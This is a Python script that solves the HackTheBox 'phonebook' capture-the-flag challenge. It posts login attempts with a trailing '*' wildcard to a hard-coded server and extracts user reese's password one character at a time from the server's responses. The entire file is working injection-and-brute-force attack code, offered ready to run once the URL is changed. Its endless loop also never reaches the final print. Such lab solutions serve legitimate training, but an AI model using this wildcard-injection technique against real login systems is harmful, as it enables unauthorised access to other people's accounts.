#!/usr/bin/python3

# Title : HackTheBox Challange phonebook
# Author : kaal
# Github : https://github.com/kaal18
# HackTheBox : https://app.hackthebox.com/profile/248660

# Change The URL and you are good to go.

import requests
import os

URL = "http://139.59.175.51:31705/login"

char = ''

# This will exclude * character
for j in range(32,42):
	char += chr(j)
for j in range(43,126):
	char += chr(j)

passwd = ""
Data = {"username":"reese","password":passwd}

print("Please Wait it may take some time : ⌛ ")

while True:
	for i in char:
		Data['password'] = passwd + i + "*"
		r = requests.post(URL,data=Data)
		
		if ("No search results." in r.text):
			passwd += i
			os.system("clear")
			print("Cracking Password : ",passwd)
		else :
			pass

print("Your password is : ",passwd)


